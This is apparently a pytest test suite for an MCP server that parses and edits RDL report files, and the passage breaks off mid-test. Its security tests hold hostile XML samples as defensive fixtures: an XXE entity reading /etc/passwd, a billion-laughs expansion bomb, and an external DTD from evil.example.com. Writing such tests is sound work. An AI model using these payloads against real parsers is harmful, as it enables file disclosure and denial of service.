"""
Tests for RDL MCP Server

Run with: pytest tests/ -v
"""

import pytest
import tempfile
import shutil
import os
import sys

# Add parent directory to path for imports
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from rdl_mcp.server import MCPServer, mcp


# Path to test fixtures
FIXTURES_DIR = os.path.join(os.path.dirname(__file__), 'fixtures')
SAMPLE_REPORT = os.path.join(FIXTURES_DIR, 'sample_report.rdl')


@pytest.fixture(scope='module')
def server():
    """Create a single MCPServer instance for all tests."""
    return MCPServer()


@pytest.fixture
def temp_report():
    """Create a temporary copy of the sample report for write tests."""
    os.makedirs(FIXTURES_DIR, exist_ok=True)

    # Create sample report if it doesn't exist
    if not os.path.exists(SAMPLE_REPORT):
        _create_sample_report(SAMPLE_REPORT)

    # Create temp copy
    with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False) as f:
        shutil.copy(SAMPLE_REPORT, f.name)
        temp_path = f.name

    yield temp_path

    # Cleanup
    if os.path.exists(temp_path):
        os.unlink(temp_path)


def _create_sample_report(path: str):
    """Create a minimal sample RDL report for testing."""
    rdl_content = '''<?xml version="1.0" encoding="utf-8"?>
<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition" xmlns:rd="http://schemas.microsoft.com/SQLServer/reporting/reportdesigner">
  <DataSources>
    <DataSource Name="TestDataSource">
      <ConnectionProperties>
        <DataProvider>SQL</DataProvider>
        <ConnectString>Data Source=localhost;Initial Catalog=TestDB</ConnectString>
      </ConnectionProperties>
    </DataSource>
  </DataSources>
  <DataSets>
    <DataSet Name="MainDataset">
      <Query>
        <DataSourceName>TestDataSource</DataSourceName>
        <CommandType>StoredProcedure</CommandType>
        <CommandText>usp_GetTestData</CommandText>
        <QueryParameters>
          <QueryParameter Name="@StartDate">
            <Value>=Parameters!StartDate.Value</Value>
          </QueryParameter>
        </QueryParameters>
      </Query>
      <Fields>
        <Field Name="ID">
          <DataField>ID</DataField>
          <rd:TypeName>System.Int32</rd:TypeName>
        </Field>
        <Field Name="Name">
          <DataField>Name</DataField>
          <rd:TypeName>System.String</rd:TypeName>
        </Field>
        <Field Name="Amount">
          <DataField>Amount</DataField>
          <rd:TypeName>System.Decimal</rd:TypeName>
        </Field>
        <Field Name="CreatedDate">
          <DataField>CreatedDate</DataField>
          <rd:TypeName>System.DateTime</rd:TypeName>
        </Field>
      </Fields>
    </DataSet>
    <DataSet Name="LookupDataset">
      <Query>
        <DataSourceName>TestDataSource</DataSourceName>
        <CommandType>StoredProcedure</CommandType>
        <CommandText>usp_GetLookupData</CommandText>
      </Query>
      <Fields>
        <Field Name="LookupID">
          <DataField>LookupID</DataField>
          <rd:TypeName>System.Int32</rd:TypeName>
        </Field>
        <Field Name="LookupValue">
          <DataField>LookupValue</DataField>
          <rd:TypeName>System.String</rd:TypeName>
        </Field>
      </Fields>
    </DataSet>
  </DataSets>
  <ReportParameters>
    <ReportParameter Name="StartDate">
      <DataType>DateTime</DataType>
      <Prompt>Start Date</Prompt>
    </ReportParameter>
    <ReportParameter Name="EndDate">
      <DataType>DateTime</DataType>
      <Prompt>End Date</Prompt>
    </ReportParameter>
  </ReportParameters>
  <ReportSections>
    <ReportSection>
      <Body>
        <ReportItems>
          <Tablix Name="MainTable">
            <TablixBody>
              <TablixColumns>
                <TablixColumn>
                  <Width>1in</Width>
                </TablixColumn>
                <TablixColumn>
                  <Width>2in</Width>
                </TablixColumn>
                <TablixColumn>
                  <Width>1.5in</Width>
                </TablixColumn>
              </TablixColumns>
              <TablixRows>
                <TablixRow>
                  <Height>0.25in</Height>
                  <TablixCells>
                    <TablixCell>
                      <CellContents>
                        <Textbox Name="HeaderID">
                          <Paragraphs>
                            <Paragraph>
                              <TextRuns>
                                <TextRun>
                                  <Value>ID</Value>
                                </TextRun>
                              </TextRuns>
                            </Paragraph>
                          </Paragraphs>
                        </Textbox>
                      </CellContents>
                    </TablixCell>
                    <TablixCell>
                      <CellContents>
                        <Textbox Name="HeaderName">
                          <Paragraphs>
                            <Paragraph>
                              <TextRuns>
                                <TextRun>
                                  <Value>Name</Value>
                                </TextRun>
                              </TextRuns>
                            </Paragraph>
                          </Paragraphs>
                        </Textbox>
                      </CellContents>
                    </TablixCell>
                    <TablixCell>
                      <CellContents>
                        <Textbox Name="HeaderAmount">
                          <Paragraphs>
                            <Paragraph>
                              <TextRuns>
                                <TextRun>
                                  <Value>Amount</Value>
                                </TextRun>
                              </TextRuns>
                            </Paragraph>
                          </Paragraphs>
                        </Textbox>
                      </CellContents>
                    </TablixCell>
                  </TablixCells>
                </TablixRow>
                <TablixRow>
                  <Height>0.25in</Height>
                  <TablixCells>
                    <TablixCell>
                      <CellContents>
                        <Textbox Name="DataID">
                          <Paragraphs>
                            <Paragraph>
                              <TextRuns>
                                <TextRun>
                                  <Value>=Fields!ID.Value</Value>
                                </TextRun>
                              </TextRuns>
                            </Paragraph>
                          </Paragraphs>
                        </Textbox>
                      </CellContents>
                    </TablixCell>
                    <TablixCell>
                      <CellContents>
                        <Textbox Name="DataName">
                          <Paragraphs>
                            <Paragraph>
                              <TextRuns>
                                <TextRun>
                                  <Value>=Fields!Name.Value</Value>
                                </TextRun>
                              </TextRuns>
                            </Paragraph>
                          </Paragraphs>
                        </Textbox>
                      </CellContents>
                    </TablixCell>
                    <TablixCell>
                      <CellContents>
                        <Textbox Name="DataAmount">
                          <Paragraphs>
                            <Paragraph>
                              <TextRuns>
                                <TextRun>
                                  <Value>=Fields!Amount.Value</Value>
                                  <Style>
                                    <Format>#,0.00</Format>
                                  </Style>
                                </TextRun>
                              </TextRuns>
                            </Paragraph>
                          </Paragraphs>
                        </Textbox>
                      </CellContents>
                    </TablixCell>
                  </TablixCells>
                </TablixRow>
              </TablixRows>
            </TablixBody>
            <TablixColumnHierarchy>
              <TablixMembers>
                <TablixMember />
                <TablixMember />
                <TablixMember />
              </TablixMembers>
            </TablixColumnHierarchy>
            <TablixRowHierarchy>
              <TablixMembers>
                <TablixMember>
                  <KeepWithGroup>After</KeepWithGroup>
                </TablixMember>
                <TablixMember>
                  <Group Name="DetailGroup" />
                </TablixMember>
              </TablixMembers>
            </TablixRowHierarchy>
            <DataSetName>MainDataset</DataSetName>
          </Tablix>
        </ReportItems>
      </Body>
      <Page>
        <PageWidth>8.5in</PageWidth>
        <PageHeight>11in</PageHeight>
        <LeftMargin>0.5in</LeftMargin>
        <RightMargin>0.5in</RightMargin>
      </Page>
    </ReportSection>
  </ReportSections>
</Report>'''

    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'w') as f:
        f.write(rdl_content)


class TestDescribeReport:
    """Tests for describe_rdl_report function."""

    def test_describe_returns_report_structure(self, server, temp_report):
        result = server.describe_rdl_report(temp_report)

        assert 'datasets' in result
        assert 'report_summary' in result
        assert 'filepath' in result

    def test_describe_lists_datasets(self, server, temp_report):
        result = server.describe_rdl_report(temp_report)

        dataset_names = [d['name'] for d in result['datasets']]
        assert 'MainDataset' in dataset_names
        assert 'LookupDataset' in dataset_names

    def test_describe_includes_summary_counts(self, server, temp_report):
        result = server.describe_rdl_report(temp_report)

        summary = result['report_summary']
        assert summary['datasets'] == 2
        assert summary['parameters'] == 2
        assert summary['table_columns'] == 3


class TestGetDatasets:
    """Tests for get_rdl_datasets function."""

    def test_get_datasets_returns_all_datasets(self, server, temp_report):
        result = server.get_rdl_datasets(temp_report)

        assert 'datasets' in result
        assert len(result['datasets']) == 2

    def test_get_datasets_includes_field_count(self, server, temp_report):
        result = server.get_rdl_datasets(temp_report)

        main_ds = next(d for d in result['datasets'] if d['name'] == 'MainDataset')
        assert main_ds['field_count'] == 4

    def test_get_datasets_with_field_limit(self, server, temp_report):
        result = server.get_rdl_datasets(temp_report, field_limit=2)

        main_ds = next(d for d in result['datasets'] if d['name'] == 'MainDataset')
        assert 'fields' in main_ds
        assert len(main_ds['fields']) == 2
        assert main_ds['fields_truncated'] == True

    def test_get_datasets_all_fields(self, server, temp_report):
        result = server.get_rdl_datasets(temp_report, field_limit=-1)

        main_ds = next(d for d in result['datasets'] if d['name'] == 'MainDataset')
        assert len(main_ds['fields']) == 4
        assert main_ds['fields_truncated'] == False

    def test_get_datasets_includes_stored_procedure(self, server, temp_report):
        result = server.get_rdl_datasets(temp_report)

        main_ds = next(d for d in result['datasets'] if d['name'] == 'MainDataset')
        assert main_ds['command_type'] == 'StoredProcedure'
        assert main_ds['command_text'] == 'usp_GetTestData'


class TestGetParameters:
    """Tests for get_rdl_parameters function."""

    def test_get_parameters_returns_all_parameters(self, server, temp_report):
        result = server.get_rdl_parameters(temp_report)

        assert 'parameters' in result
        assert len(result['parameters']) == 2

    def test_get_parameters_includes_type(self, server, temp_report):
        result = server.get_rdl_parameters(temp_report)

        start_param = next(p for p in result['parameters'] if p['name'] == 'StartDate')
        assert start_param['data_type'] == 'DateTime'
        assert start_param['prompt'] == 'Start Date'


class TestGetColumns:
    """Tests for get_rdl_columns function."""

    def test_get_columns_returns_column_info(self, server, temp_report):
        result = server.get_rdl_columns(temp_report)

        assert 'columns' in result
        assert len(result['columns']) == 3

    def test_get_columns_includes_headers(self, server, temp_report):
        result = server.get_rdl_columns(temp_report)

        headers = [c['header'] for c in result['columns']]
        assert 'ID' in headers
        assert 'Name' in headers
        assert 'Amount' in headers

    def test_get_columns_includes_field_binding(self, server, temp_report):
        result = server.get_rdl_columns(temp_report)

        amount_col = next(c for c in result['columns'] if c['header'] == 'Amount')
        assert amount_col['field_binding'] == '=Fields!Amount.Value'
        assert amount_col['field_name'] == 'Amount'


class TestValidation:
    """Tests for validate_rdl function."""

    def test_valid_report_passes(self, server, temp_report):
        result = server.validate_rdl(temp_report)

        assert result['valid'] == True

    def test_invalid_field_reference_fails(self, server, temp_report):
        # Modify report to have invalid field reference
        with open(temp_report, 'r') as f:
            content = f.read()
        content = content.replace('=Fields!Amount.Value', '=Fields!NonExistent.Value')
        with open(temp_report, 'w') as f:
            f.write(content)

        result = server.validate_rdl(temp_report)

        assert result['valid'] == False
        assert any('NonExistent' in issue for issue in result['issues'])

    def test_missing_dataset_fails(self, server):
        # Create report with reference to non-existent dataset
        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
            f.write('''<?xml version="1.0" encoding="utf-8"?>
<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition">
  <DataSets></DataSets>
  <ReportSections><ReportSection><Body><ReportItems>
  </ReportItems></Body></ReportSection></ReportSections>
</Report>''')
            temp_path = f.name

        try:
            result = server.validate_rdl(temp_path)
            assert result['valid'] == False
            assert any('No datasets' in issue for issue in result['issues'])
        finally:
            os.unlink(temp_path)


class TestExpressionParsing:
    """Tests for field reference extraction from expressions."""

    def test_simple_field_reference(self, server):
        result = server._extract_field_references_with_context(
            '=Fields!Name.Value',
            'MainDataset'
        )

        assert 'MainDataset' in result
        assert 'Name' in result['MainDataset']

    def test_aggregate_function(self, server):
        result = server._extract_field_references_with_context(
            '=Sum(Fields!Amount.Value)',
            'MainDataset'
        )

        assert 'MainDataset' in result
        assert 'Amount' in result['MainDataset']

    def test_aggregate_with_scope(self, server):
        result = server._extract_field_references_with_context(
            '=First(Fields!LookupValue.Value, "LookupDataset")',
            'MainDataset'
        )

        assert 'LookupDataset' in result
        assert 'LookupValue' in result['LookupDataset']
        assert 'MainDataset' not in result

    def test_lookup_function(self, server):
        result = server._extract_field_references_with_context(
            '=Lookup(Fields!ID.Value, Fields!LookupID.Value, Fields!LookupValue.Value, "LookupDataset")',
            'MainDataset'
        )

        # Source field should be in MainDataset
        assert 'MainDataset' in result
        assert 'ID' in result['MainDataset']

        # Target fields should be in LookupDataset
        assert 'LookupDataset' in result
        assert 'LookupID' in result['LookupDataset']
        assert 'LookupValue' in result['LookupDataset']

    def test_complex_expression(self, server):
        result = server._extract_field_references_with_context(
            '=IIF(Fields!Amount.Value > 0, Fields!Name.Value, "N/A")',
            'MainDataset'
        )

        assert 'MainDataset' in result
        assert 'Amount' in result['MainDataset']
        assert 'Name' in result['MainDataset']

    def test_non_expression_returns_empty(self, server):
        result = server._extract_field_references_with_context(
            'Static Text',
            'MainDataset'
        )

        assert result == {}


class TestColumnOperations:
    """Tests for column add/remove/update operations."""

    def test_update_column_header(self, server, temp_report):
        result = server.update_column_header(temp_report, 'Name', 'Full Name')

        assert result['success'] == True

        # Verify the change
        columns = server.get_rdl_columns(temp_report)
        headers = [c['header'] for c in columns['columns']]
        assert 'Full Name' in headers
        assert 'Name' not in headers

    def test_update_column_width(self, server, temp_report):
        result = server.update_column_width(temp_report, 0, '1.5in')

        assert result['success'] == True

        # Verify the change
        columns = server.get_rdl_columns(temp_report)
        assert columns['columns'][0]['width'] == '1.5in'

    def test_update_column_format(self, server, temp_report):
        result = server.update_column_format(temp_report, 2, 'C2')

        assert result['success'] == True

    def test_add_column_data_textbox_named_after_field(self, server, temp_report):
        result = server.add_column(
            temp_report, -1, 'Ship Date', '=Fields!Ship_Date.Value'
        )
        assert result['success'] == True

        import xml.etree.ElementTree as ET
        tree = ET.parse(temp_report)
        root = tree.getroot()
        ns = '{http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition}'

        tablix_rows = root.findall(f'.//{ns}TablixBody/{ns}TablixRows/{ns}TablixRow')
        data_row = None
        for row in tablix_rows:
            cells = row.findall(f'{ns}TablixCells/{ns}TablixCell')
            # Data row cells contain field bindings, not plain string headers
            for cell in cells:
                val = cell.find(f'.//{ns}Value')
                if val is not None and val.text and val.text.startswith('=Fields!'):
                    data_row = row
                    break
            if data_row is not None:
                break

        assert data_row is not None, 'No data row found'
        cells = data_row.findall(f'{ns}TablixCells/{ns}TablixCell')
        new_cell = cells[-1]
        textbox = new_cell.find(f'.//{ns}Textbox')
        assert textbox is not None
        assert textbox.get('Name') == 'Ship_Date', (
            f"Expected 'Ship_Date', got '{textbox.get('Name')}'"
        )

    def test_add_column_data_textbox_fallback_name_without_fields_binding(self, server, temp_report):
        result = server.add_column(
            temp_report, -1, 'Literal Col', 'some literal'
        )
        assert result['success'] == True

        import xml.etree.ElementTree as ET
        tree = ET.parse(temp_report)
        root = tree.getroot()
        ns = '{http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition}'

        tablix_rows = root.findall(f'.//{ns}TablixBody/{ns}TablixRows/{ns}TablixRow')
        for row in tablix_rows:
            cells = row.findall(f'{ns}TablixCells/{ns}TablixCell')
            for cell in cells:
                val = cell.find(f'.//{ns}Value')
                if val is not None and val.text == 'some literal':
                    textbox = cell.find(f'.//{ns}Textbox')
                    assert textbox is not None
                    # Should fall back to a generic Textbox name (not crash)
                    assert textbox.get('Name') is not None
                    return
        assert False, 'Data cell with literal value not found'

    def test_remove_column(self, server, temp_report):
        # Get initial column count
        columns_before = server.get_rdl_columns(temp_report)
        assert len(columns_before['columns']) == 3

        result = server.remove_column(temp_report, 1)
        assert result['success'] == True

        # Verify column was removed
        columns_after = server.get_rdl_columns(temp_report)
        assert len(columns_after['columns']) == 2

    def test_remove_column_auto_adjusts_page_width_by_default(self, server, temp_report):
        # Initial columns: 1in + 2in + 1.5in = 4.5in total
        # Page has 0.5in margins on each side
        # Remove column 1 (2in) - should now be 2.5in total
        # Expected new page width: 2.5in + 0.5in + 0.5in = 3.5in

        result = server.remove_column(temp_report, 1)
        assert result['success'] == True

        # Verify page width was adjusted
        import xml.etree.ElementTree as ET
        tree = ET.parse(temp_report)
        root = tree.getroot()
        ns = '{http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition}'
        page_width = root.find(f'.//{ns}PageWidth')
        assert page_width is not None
        # Page width should be reduced (original was 8.5in)
        assert float(page_width.text.replace('in', '')) < 8.5

    def test_remove_column_without_auto_adjust(self, server, temp_report):
        # Get original page width
        import xml.etree.ElementTree as ET
        tree = ET.parse(temp_report)
        root = tree.getroot()
        ns = '{http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition}'
        original_page_width = root.find(f'.//{ns}PageWidth').text

        # Remove column with auto_adjust_page_width=False
        result = server.remove_column(temp_report, 1, auto_adjust_page_width=False)
        assert result['success'] == True

        # Verify page width was NOT changed
        tree = ET.parse(temp_report)
        root = tree.getroot()
        page_width = root.find(f'.//{ns}PageWidth')
        assert page_width.text == original_page_width


class TestUpdateColumnColors:
    """Tests for update_column_colors operation."""

    RDL_NS = '{http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition}'

    def _parse_report(self, filepath: str):
        """Parse the RDL file and return (root, ns) for assertions."""
        import xml.etree.ElementTree as ET
        root = ET.parse(filepath).getroot()
        return root, self.RDL_NS

    def test_update_data_text_color(self, server, temp_report):
        result = server.update_column_colors(temp_report, 0, text_color='Red')

        assert result['success'] == True

        root, ns = self._parse_report(temp_report)
        textbox = root.find(f'.//{ns}Textbox[@Name="DataID"]')
        assert textbox is not None
        style = textbox.find(f'{ns}Style')
        assert style is not None
        color_elem = style.find(f'{ns}Color')
        assert color_elem is not None
        assert color_elem.text == 'Red'

    def test_update_data_background_color(self, server, temp_report):
        result = server.update_column_colors(temp_report, 1, background_color='LightBlue')

        assert result['success'] == True

        root, ns = self._parse_report(temp_report)
        textbox = root.find(f'.//{ns}Textbox[@Name="DataName"]')
        assert textbox is not None
        style = textbox.find(f'{ns}Style')
        assert style is not None
        bg_elem = style.find(f'{ns}BackgroundColor')
        assert bg_elem is not None
        assert bg_elem.text == 'LightBlue'

    def test_update_header_text_color(self, server, temp_report):
        result = server.update_column_colors(temp_report, 2, header_text_color='White')

        assert result['success'] == True

        root, ns = self._parse_report(temp_report)
        textbox = root.find(f'.//{ns}Textbox[@Name="HeaderAmount"]')
        assert textbox is not None
        style = textbox.find(f'{ns}Style')
        assert style is not None
        color_elem = style.find(f'{ns}Color')
        assert color_elem is not None
        assert color_elem.text == 'White'

    def test_update_header_background_color(self, server, temp_report):
        result = server.update_column_colors(temp_report, 0, header_background_color='DarkBlue')

        assert result['success'] == True

        root, ns = self._parse_report(temp_report)
        textbox = root.find(f'.//{ns}Textbox[@Name="HeaderID"]')
        assert textbox is not None
        style = textbox.find(f'{ns}Style')
        assert style is not None
        bg_elem = style.find(f'{ns}BackgroundColor')
        assert bg_elem is not None
        assert bg_elem.text == 'DarkBlue'

    def test_update_all_colors(self, server, temp_report):
        result = server.update_column_colors(
            temp_report, 1,
            text_color='Black',
            background_color='White',
            header_text_color='White',
            header_background_color='Navy'
        )

        assert result['success'] == True

        root, ns = self._parse_report(temp_report)

        # Check data cell
        data_textbox = root.find(f'.//{ns}Textbox[@Name="DataName"]')
        assert data_textbox is not None
        data_style = data_textbox.find(f'{ns}Style')
        assert data_style.find(f'{ns}Color').text == 'Black'
        assert data_style.find(f'{ns}BackgroundColor').text == 'White'

        # Check header cell
        header_textbox = root.find(f'.//{ns}Textbox[@Name="HeaderName"]')
        assert header_textbox is not None
        header_style = header_textbox.find(f'{ns}Style')
        assert header_style.find(f'{ns}Color').text == 'White'
        assert header_style.find(f'{ns}BackgroundColor').text == 'Navy'

    def test_no_colors_provided_returns_error(self, server, temp_report):
        result = server.update_column_colors(temp_report, 0)

        assert result['success'] == False
        assert 'At least one color parameter must be provided' in result['message']

    def test_invalid_column_index_returns_error(self, server, temp_report):
        result = server.update_column_colors(temp_report, 99, text_color='Red')

        assert result['success'] == False
        assert 'out of range' in result['message']

    def test_update_colors_preserves_existing_format(self, server, temp_report):
        # First set a format on the column
        server.update_column_format(temp_report, 2, 'C2')
        # Then set a color
        result = server.update_column_colors(temp_report, 2, background_color='Yellow')

        assert result['success'] == True

        root, ns = self._parse_report(temp_report)
        textbox = root.find(f'.//{ns}Textbox[@Name="DataAmount"]')
        assert textbox is not None
        # BackgroundColor is on the Textbox-level Style
        style = textbox.find(f'{ns}Style')
        assert style is not None
        assert style.find(f'{ns}BackgroundColor').text == 'Yellow'
        # Format is on the TextRun-level Style - verify it's still there
        text_run = textbox.find(f'.//{ns}TextRun')
        tr_style = text_run.find(f'{ns}Style')
        assert tr_style is not None
        assert tr_style.find(f'{ns}Format').text == 'C2'


class TestDatasetOperations:
    """Tests for dataset field operations."""

    def test_add_dataset_field(self, server, temp_report):
        result = server.add_dataset_field(
            temp_report,
            'MainDataset',
            'NewField',
            'NewField',
            'System.String'
        )

        assert result['success'] == True

        # Verify the field was added
        datasets = server.get_rdl_datasets(temp_report, field_limit=-1)
        main_ds = next(d for d in datasets['datasets'] if d['name'] == 'MainDataset')
        field_names = [f['name'] for f in main_ds['fields']]
        assert 'NewField' in field_names

    def test_remove_dataset_field(self, server, temp_report):
        # First verify the field exists
        datasets = server.get_rdl_datasets(temp_report, field_limit=-1)
        main_ds = next(d for d in datasets['datasets'] if d['name'] == 'MainDataset')
        assert any(f['name'] == 'CreatedDate' for f in main_ds['fields'])

        # Remove it
        result = server.remove_dataset_field(temp_report, 'MainDataset', 'CreatedDate')
        assert result['success'] == True

        # Verify it's gone
        datasets = server.get_rdl_datasets(temp_report, field_limit=-1)
        main_ds = next(d for d in datasets['datasets'] if d['name'] == 'MainDataset')
        assert not any(f['name'] == 'CreatedDate' for f in main_ds['fields'])

    def test_update_stored_procedure(self, server, temp_report):
        result = server.update_stored_procedure(
            temp_report,
            'MainDataset',
            'usp_NewProcedure'
        )

        assert result['success'] == True

        # Verify the change
        datasets = server.get_rdl_datasets(temp_report)
        main_ds = next(d for d in datasets['datasets'] if d['name'] == 'MainDataset')
        assert main_ds['command_text'] == 'usp_NewProcedure'


class TestParameterOperations:
    """Tests for parameter operations."""

    def test_add_parameter(self, server, temp_report):
        result = server.add_parameter(
            temp_report,
            'NewParam',
            'String',
            'Enter a value'
        )

        assert result['success'] == True

        # Verify the parameter was added
        params = server.get_rdl_parameters(temp_report)
        param_names = [p['name'] for p in params['parameters']]
        assert 'NewParam' in param_names

    def test_update_parameter_prompt(self, server, temp_report):
        result = server.update_parameter(
            temp_report,
            'StartDate',
            prompt='Select Start Date'
        )

        assert result['success'] == True

        # Verify the change
        params = server.get_rdl_parameters(temp_report)
        start_param = next(p for p in params['parameters'] if p['name'] == 'StartDate')
        assert start_param['prompt'] == 'Select Start Date'


class TestErrorHandling:
    """Tests for error handling."""

    def test_invalid_file_path(self, server):
        result = server.validate_rdl('/nonexistent/path/report.rdl')

        assert result['valid'] == False
        assert len(result['issues']) > 0

    def test_invalid_xml(self, server):
        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
            f.write('not valid xml <>')
            temp_path = f.name

        try:
            result = server.validate_rdl(temp_path)
            assert result['valid'] == False
            assert any('Parse Error' in issue or 'Error' in issue for issue in result['issues'])
        finally:
            os.unlink(temp_path)

    def test_update_nonexistent_parameter(self, server, temp_report):
        result = server.update_parameter(temp_report, 'NonExistent', prompt='Test')

        assert result['success'] == False
        assert 'not found' in result['message']


class TestSecurityXXE:
    """Tests for XML External Entity (XXE) prevention (CWE-611, CWE-776)."""

    def test_xxe_external_entity_blocked(self, server):
        """Verify that XML with external entity declarations is rejected."""
        xxe_content = '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition">
  <DataSets>
    <DataSet Name="&xxe;">
      <Query>
        <CommandText>test</CommandText>
      </Query>
      <Fields/>
    </DataSet>
  </DataSets>
</Report>'''

        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
            f.write(xxe_content)
            temp_path = f.name

        try:
            result = server.validate_rdl(temp_path)
            # defusedxml should block parsing; validation returns error
            assert result['valid'] == False
        finally:
            os.unlink(temp_path)

    def test_xxe_entity_expansion_bomb_blocked(self, server):
        """Verify that entity expansion (billion laughs) attacks are rejected."""
        bomb_content = '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition">
  <DataSets>
    <DataSet Name="&lol3;">
      <Query>
        <CommandText>test</CommandText>
      </Query>
      <Fields/>
    </DataSet>
  </DataSets>
</Report>'''

        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
            f.write(bomb_content)
            temp_path = f.name

        try:
            result = server.validate_rdl(temp_path)
            assert result['valid'] == False
        finally:
            os.unlink(temp_path)

    def test_xxe_parameter_injection_blocked(self, server):
        """Verify XXE is blocked via external DTD reference."""
        xxe_content = '''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo SYSTEM "http://evil.example.com/xxe.dtd">
<Report xmlns="http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition">
  <DataSets/>
</Report>'''

        with tempfile.NamedTemporaryFile(suffix='.rdl', delete=False, mode='w') as f:
            f.write(xxe_content)
            temp_path = f.name

        try:
            result = server.validate_rdl(temp_path)
            assert result['valid'] == False
        finally:
            os.unlink(temp_path)


class TestSecurityPathTraversal:
    """Tests for path traversal prevention (CWE-22)."""

    def test_non_rdl_extension_rejected(self, server):
        """Verify that files without .rdl extension are rejected."""
        with tempfile.NamedTemporaryFile(suffix='.xml', delete=False, mode='w') as f:
            f.write('<root/>')
            temp_path = f.name

        try:
            result = server.describe_rdl_report(temp_path)
            # Should not succeed with non-rdl file
            pytest.fail("Expected an error for non-.rdl file")
        except ValueError as e:
            assert "Only .rdl files are supported" in str(e)
        finally:
            os.unlink(temp_path)

    def test_sensitive_file_read_blocked(self, server):
        """Verify that reading non-.rdl system files is blocked."""
        try:
            result = server.describe_rdl_report('/etc/passwd')
            pytest.fail("Expected an error for non-.rdl file")
        except ValueError as e:
            assert "Only .rdl files are supported" in str(e)

    def test_symlink_resolved(self, server, temp_report):
        """Verify that symlinks are resolved (preventing symlink-based traversal)."""
        import rdl_mcp.xml_utils as xml_utils

        # Create a symlink to the .rdl file - this should work fine
        symlink_path = temp_report + '.link.rdl'
        try:
            os.symlink(temp_report, symlink_path)
            resolved = xml_utils.validate_filepath(symlink_path)
            # Should resolve to the real path
            assert resolved == os.path.realpath(temp_report)
        finally:
            if os.path.exists(symlink_path):
                os.unlink(symlink_path)

    def test_empty_filepath_rejected(self, server):
        """Verify that empty filepath is rejected."""
        try:
            server.describe_rdl_report('')
            pytest.fail("Expected an error for empty filepath")
        except ValueError as e:
            assert "non-empty string" in str(e)

    def test_none_filepath_rejected(self, server):
        """Verify that None filepath is rejected."""
        try:
            server.describe_rdl_report(None)
            pytest.fail("Expected an error for None filepath")
        except (ValueError, TypeError):
            pass  # Either error type is acceptable


class TestSecurityReDoS:
    """Tests for Regular Expression Denial of Service prevention (CWE-1333)."""

    def test_long_regex_pattern_rejected(self, server, temp_report):
        """Verify that excessively long regex patterns are handled safely."""
        # Create a very long regex pattern
        long_pattern = 'a' * 201
        result = server.get_rdl_datasets(temp_report, field_limit=-1, field_pattern=long_pattern)
        # Should return all fields unfiltered rather than crash
        assert 'datasets' in result

    def test_invalid_regex_handled_gracefully(self, server, temp_report):
        """Verify that invalid regex patterns don't crash the server."""
        result = server.get_rdl_datasets(temp_report, field_limit=-1, field_pattern='[invalid')
        assert 'datasets' in result


class TestFastMCPServer:
    """Tests verifying fastmcp tool registration."""

    EXPECTED_TOOLS = {
        'describe_rdl_report',
        'get_rdl_datasets',
        'get_rdl_parameters',
        'get_rdl_columns',
        'validate_rdl',
        'update_column_header',
        'update_column_width',
        'update_column_format',
        'update_column_colors',
        'add_column',
        'remove_column',
        'update_stored_procedure',
        'add_dataset_field',
        'remove_dataset_field',
        'add_parameter',
        'update_parameter',
        # new tools
        'update_table_batch',
        'preview_table_batch',
        'get_column_styles',
        'get_table_styles',
        'get_layout_diagnostics',
    }

    def _get_tools(self):
        import asyncio
        return asyncio.run(mcp.list_tools())

    def test_all_tools_registered(self):
        registered = {t.name for t in self._get_tools()}
        assert self.EXPECTED_TOOLS == registered

    def test_tool_has_description(self):
        tools = {t.name: t for t in self._get_tools()}
        assert tools['describe_rdl_report'].description

    def test_tool_count(self):
        assert len(self._get_tools()) == len(self.EXPECTED_TOOLS)


# ---------------------------------------------------------------------------
# New feature tests
# ---------------------------------------------------------------------------

class TestUpdateTableBatch:
    """Tests for the transactional update_table_batch operation."""

    def test_batch_updates_width_and_header(self, server, temp_report):
        updates = [
            {'column_index': 0, 'width': '2in', 'header': 'Identifier'},
            {'column_index': 1, 'width': '3in'},
        ]
        result = server.update_table_batch(temp_report, updates)

        assert result['success'] is True
        assert 'mutation_id' in result
        assert 'diff' in result

        cols = server.get_rdl_columns(temp_report)['columns']
        assert cols[0]['width'] == '2in'
        assert cols[0]['header'] == 'Identifier'
        assert cols[1]['width'] == '3in'

    def test_batch_updates_format_and_colors(self, server, temp_report):
        updates = [
            {
                'column_index': 2,
                'format_string': 'C2',
                'text_color': 'Red',
                'background_color': 'LightYellow',
                'header_text_color': 'White',
                'header_background_color': 'DarkBlue',
            }
        ]
        result = server.update_table_batch(temp_report, updates)

        assert result['success'] is True

        import xml.etree.ElementTree as ET
        ns = '{http://schemas.microsoft.com/sqlserver/reporting/2016/01/reportdefinition}'
        root = ET.parse(temp_report).getroot()
        data_tb = root.find(f'.//{ns}Textbox[@Name="DataAmount"]')
        assert data_tb is not None
        assert data_tb.find(f'{ns}Style/{ns}Color').text == 'Red'
        assert data_tb.find(f'{ns}Style/{ns}BackgroundColor').text == 'LightYellow'
        tr_fmt = data_tb.find(f'.//{ns}TextRun/{ns}Style/{ns}Format')
